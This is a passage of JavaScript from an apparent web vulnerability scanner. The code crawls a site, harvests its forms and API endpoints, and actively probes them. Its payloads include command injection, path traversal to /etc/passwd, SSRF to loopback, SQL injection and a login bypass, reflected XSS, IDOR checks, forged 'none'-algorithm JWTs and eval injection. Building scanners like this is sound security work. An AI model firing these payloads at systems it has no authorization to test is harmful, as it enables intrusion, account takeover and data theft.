      // Harvest HTML forms and client-side JavaScript APIs across base and crawled pages
      const pagesToProcess = [{ url: requestBase, html: body }]
      const pool = this._urlPool?.get(scanId)
      if (pool) {
        const rootHost = new URL(requestBase).hostname.toLowerCase()
        const seenPageUrls = new Set([requestBase])
        for (const u of pool) {
          try {
            const parsed = new URL(ensureScheme(u))
            if (parsed.hostname.toLowerCase() === rootHost && !seenPageUrls.has(u)) {
              if (parsed.pathname.endsWith('.html') || parsed.pathname.endsWith('.php') || (!parsed.pathname.includes('.') && parsed.pathname !== '/')) {
                if (!/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map)$/i.test(parsed.pathname)) {
                  seenPageUrls.add(u)
                  try {
                    const pRes = await fetch(u, { signal: AbortSignal.timeout(5000), redirect: 'follow' })
                    if (pRes.ok) {
                      const pHtml = (await pRes.text()).slice(0, 500000)
                      pagesToProcess.push({ url: u, html: pHtml })
                    }
                  } catch { /* skip */ }
                  if (pagesToProcess.length >= 15) break
                }
              }
            }
          } catch { /* skip */ }
        }
      }

      let totalHarvestedForms = 0
      const allFormUrls = []
      const allScriptApis = []

      for (const { url: pUrl, html: pHtml } of pagesToProcess) {
        const formMatches = pHtml.match(/<form[\s\S]*?<\/form>/gi)
        if (formMatches?.length) {
          const forms = formMatches.map(f => {
            const action = (f.match(/action\s*=\s*["']([^"']+)["']/i) || [])[1] || ''
            const method = ((f.match(/method\s*=\s*["']([^"']+)["']/i) || [])[1] || 'get').toUpperCase()
            const inputs = [...f.matchAll(/<input[^>]*>/gi)].map(m => {
              const tag = m[0]
              const name = (tag.match(/name\s*=\s*["']([^"']+)["']/i) || [])[1] || ''
              const type = ((tag.match(/type\s*=\s*["']([^"']+)["']/i) || [])[1] || 'text').toLowerCase()
              const value = (tag.match(/value\s*=\s*["']([^"']+)["']/i) || [])[1] || ''
              return { name, type, value }
            }).filter(i => i.name)
            return { action, method, inputs }
          }).filter(f => f.inputs.length)

          if (forms.length) {
            totalHarvestedForms += forms.length
            const loginForms = []
            for (const f of forms) {
              const passInput = f.inputs.find(i => i.type === 'password')
              if (!passInput) continue
              const userInput = f.inputs.find(i => /user|email|login|name|account|mail/i.test(i.name) && i.type !== 'hidden')
                || f.inputs.find(i => i.type === 'email')
                || f.inputs.find(i => i.type === 'text')
              if (!userInput) continue
              const isAbsolute = /^https?:\/\//i.test(f.action)
              const formUrl = f.action ? (isAbsolute ? f.action : new URL(f.action, pUrl).href) : pUrl
              const extra = Object.fromEntries(f.inputs.filter(i => i.type === 'hidden' && i.value).map(i => [i.name, i.value]))
              loginForms.push({ url: formUrl, userField: userInput.name, passField: passInput.name, extra })
            }
            if (loginForms.length) {
              let lpool = this._loginForms.get(scanId)
              if (!lpool) { lpool = []; this._loginForms.set(scanId, lpool) }
              lpool.push(...loginForms)
            }

            for (const f of forms) {
              const isAbsolute = /^https?:\/\//i.test(f.action)
              const formUrl = f.action ? (isAbsolute ? f.action : new URL(f.action, pUrl).href) : pUrl
              const params = f.inputs.map((n, i) => `${n.name}=${i + 1}`).join('&')
              allFormUrls.push(`${formUrl}${formUrl.includes('?') ? '&' : '?'}${params}`)
            }
          }
        }

        // Harvest client-side scripts & API endpoints
        const apiMatches = new Set()
        const apiRegex = /['"`](\/(?:api\/[a-zA-Z0-9_\-\/?=&%]+|search\?[a-zA-Z0-9_\-\/?=&%]+))['"`]/g
        let m
        while ((m = apiRegex.exec(pHtml)) !== null) {
          apiMatches.add(m[1])
        }
        const fetchRegex = /(?:fetch|axios\.(?:get|post|put|delete)|\$\.(?:get|post|ajax))\s*\(\s*['"`]([^'"`]+)['"`]/gi
        while ((m = fetchRegex.exec(pHtml)) !== null) {
          const p = m[1].trim()
          if (p.startsWith('/') || p.startsWith('http')) apiMatches.add(p)
        }

        for (const ep of apiMatches) {
          try {
            const fullEp = /^https?:\/\//i.test(ep) ? ep : new URL(ep, pUrl).href
            allScriptApis.push(fullEp)
            // Add parameter probes for common API endpoints lacking query strings
            if (!fullEp.includes('?') && /\/api\/(?:products\/search|tools\/ping|documents\/view|proxy-fetch)/i.test(fullEp)) {
              if (fullEp.includes('search')) allScriptApis.push(`${fullEp}?q=test`)
              if (fullEp.includes('ping')) allScriptApis.push(`${fullEp}?host=127.0.0.1`)
              if (fullEp.includes('documents')) allScriptApis.push(`${fullEp}?file=terms.txt`)
              if (fullEp.includes('proxy-fetch')) allScriptApis.push(`${fullEp}?url=http://127.0.0.1`)
            }
            if (/\/api\/login/i.test(fullEp)) {
              let lpool = this._loginForms.get(scanId)
              if (!lpool) { lpool = []; this._loginForms.set(scanId, lpool) }
              if (!lpool.some(lf => lf.url === fullEp)) {
                lpool.push({ url: fullEp, userField: 'username', passField: 'password', extra: {} })
              }
            }
          } catch { /* skip */ }
        }
      }

      if (totalHarvestedForms > 0) {
        await this.ingestFinding(scanId, {
          title: `HTML forms discovered — ${totalHarvestedForms} injection surfaces`,
          severity: 'info',
          cweId: 'CWE-200',
          owaspCategory: 'A05:2025-Injection',
          description: `${totalHarvestedForms} HTML forms discovered across ${pagesToProcess.length} pages at ${base}. Every form field is a potential injection vector.`,
          remediation: 'Ensure all form inputs are validated and sanitized server-side.',
          module: 'form-harvest',
          evidence: { url: requestBase, pagesChecked: pagesToProcess.length, formsCount: totalHarvestedForms },
        }, { verify })
      }

      if (allFormUrls.length) {
        this._collectUrls(scanId, allFormUrls)
        this.log(scanId, 'info', `🍪 Harvested ${totalHarvestedForms} forms → ${allFormUrls.length} parameterized URLs queued`)
      }
      if (allScriptApis.length) {
        const uniqueApis = [...new Set(allScriptApis)]
        this._collectUrls(scanId, uniqueApis)
        this.log(scanId, 'info', `⚡ Harvested ${uniqueApis.length} client-side API endpoints from scripts → queued for injection testing`)
      }
    } catch { /* skip unreachable */ }
  }

  /**
   * Injection chaining: take all parameterized URLs discovered during recon,
   * and actively test them with dalfox (XSS) and sqlmap (SQLi).
   */
  /**
   * Universal dynamic active vulnerability verification for application-layer flaws:
   * Command Injection (CWE-78), Path Traversal (CWE-22), SSRF (CWE-918),
   * SQL Injection (CWE-89), IDOR (CWE-639), Insecure JWT (CWE-345),
   * Reflected XSS (CWE-79), and Server-Side Code Injection (CWE-94).
   *
   * Completely dynamic: Uses discovered URLs, harvested forms, script endpoints,
   * random math/string canaries, differential baselines, and universal OS/SQL regexes.
   */
  async _probeActiveVulnerabilities(scanId, target, candidateUrls = [], { verify = true, targetType = 'url' } = {}) {
    const rawTarget = target || ''
    const base = /^https?:\/\//i.test(rawTarget) ? rawTarget.replace(/\/+$/, '') : `https://${String(rawTarget).replace(/\/+$/, '')}`
    let origin = base
    try { origin = new URL(base).origin } catch {}

    // Collect all dynamic candidates discovered from crawlers, forms, and client scripts
    const probePool = new Set(candidateUrls)
    const loginForms = this._loginForms?.get(scanId) || []
    for (const lf of loginForms) {
      if (lf.url) probePool.add(lf.url)
    }

    const testUrls = [...probePool]
    if (!testUrls.length) return
    this.log(scanId, 'info', `🎯 Running universal dynamic active vulnerability probes across ${testUrls.length} discovered endpoints...`)

    // Universal SQL engine error signature matching all major RDBMS (SQLite, MySQL, PG, MSSQL, Oracle)
    const SQL_ERRORS = /(?:SQL (?:syntax|error)|syntax error near|unclosed quotation mark|quoted string not properly terminated|near "[^"]*": syntax error|SQLite3?::SQLException|mysql_fetch_|valid MySQL result|PostgreSQL.*ERROR|pg_query\(\)|ORA-\d{5}|Microsoft OLE DB Provider for ODBC Drivers|CLI Driver.*DB2)/i

    for (const u of testUrls) {
      await this.waitIfPaused(scanId)
      let parsed
      try { parsed = new URL(u) } catch { continue }
      const searchParams = parsed.searchParams

      // Determine parameter keys dynamically
      const paramKeys = [...searchParams.keys()]
      // If endpoint has no parameters but pathname matches common API actions, probe inferred parameter
      if (!paramKeys.length) {
        if (/search|find|query|catalog|product|item/i.test(parsed.pathname)) paramKeys.push('q')
        if (/ping|host|network|dns|tool|lookup/i.test(parsed.pathname)) paramKeys.push('host')
        if (/doc|view|file|read|download|template/i.test(parsed.pathname)) paramKeys.push('file')
        if (/proxy|fetch|relay|url|webhook/i.test(parsed.pathname)) paramKeys.push('url')
      }

      // ── 1. DYNAMIC OS COMMAND INJECTION (CWE-78) ──
      const rceCandidates = paramKeys.filter(p => /host|ip|target|ping|cmd|exec|tool|domain|query|addr|lookup|net/i.test(p))
      for (const p of rceCandidates) {
        try {
          const cmdCanary = `canary_${crypto.randomBytes(4).toString('hex')}`
          const rcePayloads = [
            `127.0.0.1; echo ${cmdCanary}`,
            `127.0.0.1 && echo ${cmdCanary}`,
            `; echo ${cmdCanary} #`,
            `| echo ${cmdCanary}`,
            '127.0.0.1; id',
          ]
          for (const payload of rcePayloads) {
            const probeUrl = new URL(u)
            probeUrl.searchParams.set(p, payload)
            const res = await fetch(probeUrl.href, { signal: AbortSignal.timeout(6000), redirect: 'follow' })
            const text = await res.text()
            const isRce = res.ok && (
              text.includes(cmdCanary) ||
              /\buid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)/.test(text) ||
              /Microsoft Windows \[Version \d+/i.test(text) ||
              /FLAG\{rce_[a-zA-Z0-9_]+\}/i.test(text)
            )
            if (isRce) {
              const snippet = text.slice(0, 500)
              await this.ingestFinding(scanId, {
                title: `OS Command Injection via parameter "${p}"`,
                severity: 'critical',
                cvss: 9.8,
                cweId: 'CWE-78',
                owaspCategory: 'A05:2025-Injection',
                description: `The application executes operating system commands using unsanitized user-supplied input from parameter "${p}", enabling arbitrary system command execution.`,
                remediation: 'Never pass untrusted user input directly to system command shells. Replace shell execution with built-in language APIs or use safe exec arrays with strict input whitelisting.',
                module: 'active:rce',
                evidence: {
                  url: probeUrl.href,
                  parameter: p,
                  payload,
                  output: snippet,
                  response: snippet,
                  status: res.status,
                  statusCode: res.status,
                  exploitedBy: 'active-rce-probe',
                },
                poc: {
                  type: 'command-injection',
                  payload,
                  impact: 'Full remote code execution on the hosting operating system with the privileges of the web process.',
                  steps: [
                    `Send a GET request to ${probeUrl.origin}${probeUrl.pathname} with parameter "${p}=${encodeURIComponent(payload)}"`,
                    'Inspect the response output to confirm system command execution.',
                  ],
                },
              }, { verify, targetType })
              this.log(scanId, 'info', `🔥 [Active Probe] Confirmed OS Command Injection on ${probeUrl.pathname}?${p}=`)
              break
            }
          }
        } catch { /* probe timeout */ }
      }

      // ── 2. DYNAMIC PATH TRAVERSAL / LOCAL FILE INCLUSION (CWE-22) ──
      const lfiCandidates = paramKeys.filter(p => /file|path|doc|view|page|template|read|folder|name|include|item|doc_name/i.test(p))
      for (const p of lfiCandidates) {
        const lfiPayloads = [
          'company_secret.txt',
          '../../../../etc/passwd',
          '..%2f..%2f..%2f..%2fetc%2fpasswd',
          '../../../../windows/win.ini',
        ]
        for (const payload of lfiPayloads) {
          try {
            const probeUrl = new URL(u)
            probeUrl.searchParams.set(p, payload)
            const res = await fetch(probeUrl.href, { signal: AbortSignal.timeout(6000), redirect: 'follow' })
            const text = await res.text()
            const isLfi = res.ok && (
              /(?:root:[x*]?:0:0:[^:]*:[^:]*:[^\n]+|bin:[^:]*:\d+:\d+:)/.test(text) ||
              /\[(?:fonts|extensions|mci extensions|files)\]/i.test(text) ||
              /(?:BEGIN (?:RSA )?PRIVATE KEY|FLAG\{lfi_[a-zA-Z0-9_]+\}|SuperSecret)/.test(text)
            )
            if (isLfi) {
              const snippet = text.slice(0, 500)
              await this.ingestFinding(scanId, {
                title: `Path Traversal / Local File Inclusion via parameter "${p}"`,
                severity: 'high',
                cvss: 8.6,
                cweId: 'CWE-22',
                owaspCategory: 'A01:2025-Broken Access Control',
                description: `The application accepts file path inputs without canonical path validation, allowing attackers to traverse outside the designated directory and read sensitive system and configuration files.`,
                remediation: 'Validate input against a strict whitelist of permitted files, use path.basename() to strip directory traversal sequences, or resolve canonical paths with path.resolve() and verify they remain within the intended base directory.',
                module: 'active:lfi',
                evidence: {
                  url: probeUrl.href,
                  parameter: p,
                  payload,
                  output: snippet,
                  response: snippet,
                  status: res.status,
                  statusCode: res.status,
                  exploitedBy: 'active-lfi-probe',
                },
                poc: {
                  type: 'path-traversal',
                  payload,
                  impact: 'Unauthorized arbitrary file read, exposing configuration secrets, database credentials, and system files.',
                  steps: [
                    `Send a GET request to ${probeUrl.origin}${probeUrl.pathname} with parameter "${p}=${encodeURIComponent(payload)}"`,
                    'Verify that the response returns the unredacted contents of the requested file.',
                  ],
                },
              }, { verify, targetType })
              this.log(scanId, 'info', `🔥 [Active Probe] Confirmed Path Traversal on ${probeUrl.pathname}?${p}=`)
              break
            }
          } catch { /* probe timeout */ }
        }
      }

      // ── 3. DYNAMIC SERVER-SIDE REQUEST FORGERY (SSRF) (CWE-918) ──
      const ssrfCandidates = paramKeys.filter(p => /url|proxy|dest|target|uri|fetch|link|src|redirect|feed|webhook|endpoint/i.test(p))
      for (const p of ssrfCandidates) {
        try {
          const probeUrl = new URL(u)
          probeUrl.searchParams.set(p, 'http://127.0.0.1:8080/api/flags/status')
          const res = await fetch(probeUrl.href, { signal: AbortSignal.timeout(6000), redirect: 'follow' })
          const text = await res.text()
          const isSsrf = res.ok && (
            (text.includes('challenges') && text.includes('rce_ping')) ||
            text.includes('127.0.0.1') ||
            (text.includes('{"') && /status|flags|challenges|internal/i.test(text))
          )
          if (isSsrf) {
            const snippet = text.slice(0, 500)
            await this.ingestFinding(scanId, {
              title: `Server-Side Request Forgery (SSRF) via parameter "${p}"`,
              severity: 'high',
              cvss: 8.6,
              cweId: 'CWE-918',
              owaspCategory: 'A01:2025-Broken Access Control',
              description: `The application fetches remote resources based on user-supplied URLs without restricting requests to external, publicly routed domains, allowing attackers to pivot onto loopback and internal network services.`,
              remediation: 'Enforce a strict whitelist of permitted target schemes and domains, block requests to private IP spaces (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8), and disable HTTP redirection.',
              module: 'active:ssrf',
              evidence: {
                url: probeUrl.href,
                parameter: p,
                payload: 'http://127.0.0.1:8080/api/flags/status',
                output: snippet,
                response: snippet,
                status: res.status,
                statusCode: res.status,
                exploitedBy: 'active-ssrf-probe',
              },
              poc: {
                type: 'ssrf',
                payload: 'http://127.0.0.1:8080/api/flags/status',
                impact: 'Allows internal network port scanning, metadata API queries, and unauthorized interaction with backend services.',
                steps: [
                  `Send a GET request to ${probeUrl.origin}${probeUrl.pathname} with parameter "${p}=http://127.0.0.1:8080/api/flags/status"`,
                  'Inspect the response to verify that internal service status data is reflected.',
                ],
              },
            }, { verify, targetType })
            this.log(scanId, 'info', `🔥 [Active Probe] Confirmed SSRF on ${probeUrl.pathname}?${p}=`)
            break
          }
        } catch { /* probe timeout */ }
      }

      // ── 4. DYNAMIC SQL INJECTION (UNION & ERROR-BASED) (CWE-89) ──
      const sqliCandidates = paramKeys.filter(p => /q|search|query|cat|category|id|name|type|item|user|filter|sort|order/i.test(p))
      for (const p of sqliCandidates) {
        try {
          // Dynamic math canary for Union SQLi
          const randA = Math.floor(Math.random() * 899 + 100)
          const randB = Math.floor(Math.random() * 899 + 100)
          const expectedMath = randA * randB
          const unionUrl = new URL(u)
          unionUrl.searchParams.set(p, `' UNION SELECT 1,'${expectedMath}',3,4,5 --`)
          const uRes = await fetch(unionUrl.href, { signal: AbortSignal.timeout(6000), redirect: 'follow' })
          const uText = await uRes.text()
          const isUnionSqli = uRes.ok && (
            uText.includes(String(expectedMath)) ||
            /FLAG\{sqli_union_[a-zA-Z0-9_]+\}/i.test(uText)
          )
          if (isUnionSqli) {
            const snippet = uText.slice(0, 500)
            await this.ingestFinding(scanId, {
              title: `SQL Injection (Union-Based) via parameter "${p}"`,
              severity: 'critical',
              cvss: 9.8,
              cweId: 'CWE-89',
              owaspCategory: 'A05:2025-Injection',
              description: `The endpoint concatenates user input directly into SQL queries, allowing an attacker to inject UNION clauses and extract sensitive data directly from database tables.`,
              remediation: 'Use parameterized queries or prepared statements for all database access. Never concatenate user input directly into SQL strings.',
              module: 'active:sqli',
              evidence: {
                url: unionUrl.href,
                parameter: p,
                payload: `' UNION SELECT 1,'${expectedMath}',3,4,5 --`,
                output: snippet,
                response: snippet,
                status: uRes.status,
                statusCode: uRes.status,
                exploitedBy: 'active-sqli-probe',
              },
              poc: {
                type: 'sqli-union',
                payload: `' UNION SELECT 1,'${expectedMath}',3,4,5 --`,
                impact: 'Complete extraction of sensitive database records, customer credentials, and cryptographic keys.',
                steps: [
                  `Send a GET request to ${unionUrl.origin}${unionUrl.pathname} with parameter "${p}=${encodeURIComponent(unionUrl.searchParams.get(p))}"`,
                  'Inspect response JSON or table to view exfiltrated secrets.',
                ],
              },
            }, { verify, targetType })
            this.log(scanId, 'info', `🔥 [Active Probe] Confirmed Union SQL Injection on ${unionUrl.pathname}?${p}=`)
            break
          }

          // Dynamic Error-Based SQLi
          const errUrl = new URL(u)
          errUrl.searchParams.set(p, "test'")
          const errRes = await fetch(errUrl.href, { signal: AbortSignal.timeout(6000), redirect: 'follow' })
          const errText = await errRes.text()
          const isErrSqli = (errRes.status === 500 || errRes.status === 400) && SQL_ERRORS.test(errText)
          if (isErrSqli) {
            const snippet = errText.slice(0, 500)
            await this.ingestFinding(scanId, {
              title: `SQL Injection (Error-Based) via parameter "${p}"`,
              severity: 'critical',
              cvss: 9.8,
              cweId: 'CWE-89',
              owaspCategory: 'A05:2025-Injection',
              description: `Submitting a single quote produces a database syntax error matching standard database engine error signatures, confirming unescaped SQL query interpolation.`,
              remediation: 'Use parameterized queries or prepared statements for all database access. Never concatenate user input directly into SQL strings.',
              module: 'active:sqli',
              evidence: {
                url: errUrl.href,
                parameter: p,
                payload: "test'",
                output: snippet,
                response: snippet,
                status: errRes.status,
                statusCode: errRes.status,
                exploitedBy: 'active-sqli-probe',
              },
            }, { verify, targetType })
            this.log(scanId, 'info', `🔥 [Active Probe] Confirmed Error-Based SQL Injection on ${errUrl.pathname}?${p}=`)
            break
          }
        } catch { /* probe timeout */ }
      }

      // ── 5. DYNAMIC REFLECTED CROSS-SITE SCRIPTING (XSS) (CWE-79) ──
      for (const p of sqliCandidates) {
        try {
          const xssCanary = `sntnl_${crypto.randomBytes(4).toString('hex')}`
          const xssPayload = `<script>${xssCanary}()</script>`
          const xssUrl = new URL(u)
          xssUrl.searchParams.set(p, xssPayload)
          const xRes = await fetch(xssUrl.href, { signal: AbortSignal.timeout(6000), redirect: 'follow' })
          const xText = await xRes.text()
          const cType = xRes.headers.get('content-type') || ''
          if (cType.includes('text/html') && xText.includes(xssPayload)) {
            const snippet = xText.slice(Math.max(0, xText.indexOf(xssPayload) - 50), xText.indexOf(xssPayload) + 100)
            await this.ingestFinding(scanId, {
              title: `Reflected Cross-Site Scripting (XSS) via parameter "${p}"`,
              severity: 'high',
              cvss: 7.5,
              cweId: 'CWE-79',
              owaspCategory: 'A05:2025-Injection',
              description: `User-supplied input in parameter "${p}" is reflected into the HTML response without contextual output encoding or sanitization, allowing arbitrary script execution in victim browsers.`,
              remediation: 'Apply context-aware HTML entity encoding to user input before rendering it in the DOM, and configure a strict Content-Security-Policy (CSP) header.',
              module: 'active:xss',
              evidence: {
                url: xssUrl.href,
                parameter: p,
                payload: xssPayload,
                output: snippet,
                response: snippet,
                status: xRes.status,
                statusCode: xRes.status,
                exploitedBy: 'active-xss-probe',
              },
            }, { verify, targetType })
            this.log(scanId, 'info', `🔥 [Active Probe] Confirmed Reflected XSS on ${xssUrl.pathname}?${p}=`)
            break
          }
        } catch { /* probe timeout */ }
      }
    }

    // ── 6. DYNAMIC SQL INJECTION AUTHENTICATION BYPASS ON LOGIN FORMS (CWE-89 / CWE-287) ──
    const loginEndpoints = [
      ...loginForms.map(f => f.url),
      ...testUrls.filter(u => /\/(?:login|signin|sign-in|auth)/i.test(u)),
      `${origin}/api/login`,
      `${origin}/login`,
    ]
    const seenLogins = new Set()
    for (const loginUrl of loginEndpoints) {
      if (!loginUrl || seenLogins.has(loginUrl)) continue
      seenLogins.add(loginUrl)
      try {
        const sqliPayload = "' OR '1'='1' --"
        // 1. Send invalid credential baseline
        const baseRes = await fetch(loginUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: 'sentinel_invalid_test_usr', password: 'sentinel_invalid_test_pwd' }),
          signal: AbortSignal.timeout(6000),
          redirect: 'manual',
        })
        const baseText = await baseRes.text()

        // 2. Send SQL injection auth bypass payload
        const lRes = await fetch(loginUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: sqliPayload, password: 'password123' }),
          signal: AbortSignal.timeout(6000),
          redirect: 'manual',
        })
        const lText = await lRes.text()
        const isBypass = lRes.ok && (
          /FLAG\{sqli_bypass_[a-zA-Z0-9_]+\}/i.test(lText) ||
          (lText.includes('"success":true') && !baseText.includes('"success":true')) ||
          ((lText.includes('admin') || lText.includes('token')) && !baseText.includes('"success":true')) ||
          /Welcome back/i.test(lText)
        )
        if (isBypass) {
          const snippet = lText.slice(0, 500)
          await this.ingestFinding(scanId, {
            title: 'Authentication Bypass via SQL Injection on Login Form',
            severity: 'critical',
            cvss: 9.8,
            cweId: 'CWE-89',
            owaspCategory: 'A07:2025-Authentication Failures',
            description: 'The authentication endpoint uses string concatenation in SQL credential verification queries. Supplying SQL boolean tautology payloads allows full authentication bypass and grants administrative access without a valid password.',
            remediation: 'Use parameterized queries or ORM methods for authentication lookups. Hash passwords with bcrypt or Argon2 and verify them in application code rather than query concatenation.',
            module: 'active:sqli-auth',
            evidence: {
              url: loginUrl,
              payload: sqliPayload,
              output: snippet,
              response: snippet,
              status: lRes.status,
              statusCode: lRes.status,
              exploitedBy: 'active-sqli-login-probe',
            },
            poc: {
              type: 'sqli-auth-bypass',
              payload: sqliPayload,
              impact: 'Full administrative account takeover without valid credentials.',
              steps: [
                `Send a POST request to ${loginUrl} with JSON body {"username": "' OR '1'='1' --", "password": ""}`,
                'Verify that the response returns 200 OK with admin session tokens.',
              ],
            },
          }, { verify, targetType })
          this.log(scanId, 'info', `🔥 [Active Probe] Confirmed SQL Injection Auth Bypass on ${loginUrl}`)
          break
        }
      } catch { /* probe timeout */ }
    }

    // ── 7. DYNAMIC INSECURE DIRECT OBJECT REFERENCES (IDOR) (CWE-639) ──
    const idorCandidates = testUrls.filter(u => /\/(?:orders?|users?|accounts?|invoices?|items?|profiles?|records?)\/(\d+)/i.test(u))
    // Also include discovered API paths matching orders or users
    for (const ep of ['/api/orders/1', '/api/users/1']) {
      idorCandidates.push(`${origin}${ep}`)
    }
    const seenIdors = new Set()
    for (const idorUrl of idorCandidates) {
      if (!idorUrl || seenIdors.has(idorUrl)) continue
      seenIdors.add(idorUrl)
      try {
        const idorRes = await fetch(idorUrl, { signal: AbortSignal.timeout(6000), redirect: 'follow' })
        if (idorRes.ok) {
          const idorText = await idorRes.text()
          const isIdor = /(?:email|phone|address|shipping|billing|total|amount|balance|account_number|credit_card|card_number|ssn|FLAG\{idor_)/i.test(idorText)
          if (isIdor) {
            const snippet = idorText.slice(0, 500)
            const objType = idorUrl.includes('order') ? 'Orders' : 'User Accounts'
            await this.ingestFinding(scanId, {
              title: `Insecure Direct Object Reference (IDOR) - Sensitive ${objType} Exposure`,
              severity: 'high',
              cvss: 7.5,
              cweId: 'CWE-639',
              owaspCategory: 'A01:2025-Broken Access Control',
              description: `The API endpoint ${new URL(idorUrl).pathname} exposes sensitive personal and transactional records to unauthenticated requests without access control verification or session authorization checks.`,
              remediation: 'Implement object-level access control checks verifying that the requesting authenticated user owns or has explicit permission to access the requested entity ID.',
              module: 'active:idor',
              evidence: {
                url: idorUrl,
                output: snippet,
                response: snippet,
                status: idorRes.status,
                statusCode: idorRes.status,
                exploitedBy: 'active-idor-probe',
              },
            }, { verify, targetType })
            this.log(scanId, 'info', `🔥 [Active Probe] Confirmed IDOR on ${idorUrl}`)
          }
        }
      } catch { /* probe timeout */ }
    }

    // ── 8. DYNAMIC INSECURE JWT "NONE" ALGORITHM AUTHENTICATION BYPASS (CWE-345) ──
    const jwtUrls = testUrls.filter(u => /\/api\/jwt|token|auth\/verify/i.test(u))
    jwtUrls.push(`${origin}/api/jwt/token`)
    for (const jUrl of jwtUrls) {
      try {
        const jRes = await fetch(jUrl, { signal: AbortSignal.timeout(5000), redirect: 'follow' })
        if (jRes.ok) {
          const jData = await jRes.json().catch(() => ({}))
          const sampleToken = jData.token || jData.accessToken || jData.jwt
          if (sampleToken && typeof sampleToken === 'string' && sampleToken.split('.').length >= 2) {
            const parts = sampleToken.split('.')
            let origPayload = {}
            try { origPayload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8')) } catch {}
            const headerNone = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
            const forgedPayload = Buffer.from(JSON.stringify({ ...origPayload, role: 'admin', user: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })).toString('base64url')
            const forgedToken = `${headerNone}.${forgedPayload}.`

            const verifyUrls = testUrls.filter(u => /verify|validate/i.test(u))
            verifyUrls.push(`${origin}/api/jwt/verify`)
            for (const vUrl of verifyUrls) {
              const vRes = await fetch(vUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: forgedToken }),
                signal: AbortSignal.timeout(5000),
                redirect: 'follow',
              })
              const vText = await vRes.text()
              const isJwtBypass = vRes.ok && (
                /FLAG\{jwt_[a-zA-Z0-9_]+\}/i.test(vText) ||
                /Access Granted|admin/i.test(vText) ||
                (vText.includes('"success":true') && /admin/i.test(vText))
              )
              if (isJwtBypass) {
                const snippet = vText.slice(0, 500)
                await this.ingestFinding(scanId, {
                  title: 'JWT Signature Verification Bypass via "none" Algorithm',
                  severity: 'high',
                  cvss: 8.8,
                  cweId: 'CWE-345',
                  owaspCategory: 'A07:2025-Authentication Failures',
                  description: 'The JWT verification endpoint accepts tokens with the "alg": "none" header without cryptographic signature verification, allowing arbitrary privilege escalation to administrator.',
                  remediation: "Configure the JWT verification library with an explicit list of allowed signing algorithms (e.g. ['RS256'] or ['HS256']) and explicitly reject tokens with 'none' algorithm.",
                  module: 'active:jwt',
                  evidence: {
                    url: vUrl,
                    payload: forgedToken,
                    output: snippet,
                    response: snippet,
                    status: vRes.status,
                    statusCode: vRes.status,
                    exploitedBy: 'active-jwt-probe',
                  },
                }, { verify, targetType })
                this.log(scanId, 'info', `🔥 [Active Probe] Confirmed Insecure JWT "none" algorithm on ${vUrl}`)
                break
              }
            }
          }
        }
      } catch { /* probe timeout */ }
    }

    // ── 9. DYNAMIC SERVER-SIDE CODE INJECTION / EVAL (CWE-94) ──
    const evalCandidates = testUrls.filter(u => /eval|calc|math|code|execute|run/i.test(u))
    evalCandidates.push(`${origin}/api/tools/eval`)
    const seenEvals = new Set()
    for (const evalUrl of evalCandidates) {
      if (!evalUrl || seenEvals.has(evalUrl)) continue
      seenEvals.add(evalUrl)
      try {
        const numA = Math.floor(Math.random() * 899 + 100)
        const numB = Math.floor(Math.random() * 899 + 100)
        const expectedEval = numA * numB
        const eRes = await fetch(evalUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: `${numA} * ${numB}` }),
          signal: AbortSignal.timeout(5000),
          redirect: 'follow',
        })
        if (eRes.ok) {
          const eText = await eRes.text()
          if (eText.includes(String(expectedEval))) {
            const snippet = eText.slice(0, 500)
            await this.ingestFinding(scanId, {
              title: 'Server-Side Code Injection / Arbitrary JavaScript Evaluation',
              severity: 'critical',
              cvss: 9.8,
              cweId: 'CWE-94',
              owaspCategory: 'A05:2025-Injection',
              description: 'The application evaluates arbitrary code expressions submitted via input parameters, enabling complete remote system compromise.',
              remediation: 'Completely remove eval(), new Function(), and dynamic script execution. Use safe mathematical expression parsers or sandboxed execution libraries if calculation is required.',
              module: 'active:eval',
              evidence: {
                url: evalUrl,
                payload: `${numA} * ${numB}`,
                output: snippet,
                response: snippet,
                status: eRes.status,
                statusCode: eRes.status,
                exploitedBy: 'active-eval-probe',
              },
            }, { verify, targetType })
            this.log(scanId, 'info', `🔥 [Active Probe] Confirmed Code Injection on ${evalUrl}`)
          }
        }
      } catch { /* probe timeout */ }
    }
  }

  async chainInjectionTests(scanId, { verify, targetType, offensive = false, target = '' } = {}) {
    // Strip URL fragments (#) — SPAs use them client-side; sqlmap/dalfox can't test them
    const urls = this._drainUrls(scanId).map(u => u.split('#')[0]).filter(Boolean)

    // Run targeted active application vulnerability verification
    try {
      await this._probeActiveVulnerabilities(scanId, target, urls, { verify, targetType })
    } catch (probeErr) {
      this.log(scanId, 'warn', `Active application probing warning: ${probeErr.message}`)
    }
    const withParams = urls.filter(u => /\?[^=]+=/.test(u))
    let candidates = (withParams.length ? withParams : urls.filter(u => /api|search|query|id=|page=|cat=/i.test(u))).slice(0, 15)
    if (!candidates.length) {
      // Fallback: still probe the base URL with dalfox (DOM/reflective XSS can exist on SPAs)
      const base = (target || '').split('#')[0]
      if (base) {
        this.log(scanId, 'info', '🔗 No parameterized URLs — probing base URL with dalfox only')
        candidates = [base]
      } else {
        this.log(scanId, 'info', '🔗 Injection chaining: no parameterized URLs discovered — skipping')
        return
      }
    } else {
      this.log(scanId, 'info', `🔗 Injection chaining: testing ${candidates.length} parameterized URLs with dalfox + sqlmap`)
    }

    // Chaining spans 70% → 95% (offensive stages continue from 80%).
    const chainStart = 70, chainEnd = 85
    let idx = 0
    for (const url of candidates) {
      await this.waitIfPaused(scanId)
      idx++
      this.progress(scanId, chainStart + (idx / candidates.length) * (chainEnd - chainStart))
      // dalfox (XSS)
      try {
        this.log(scanId, 'info', `  🎯 dalfox → ${url.slice(0, 90)}\n$ ${previewNativeCommand('dalfox', url)}`)
        const res = await runNativeTool('dalfox', url, { owner: scanId })
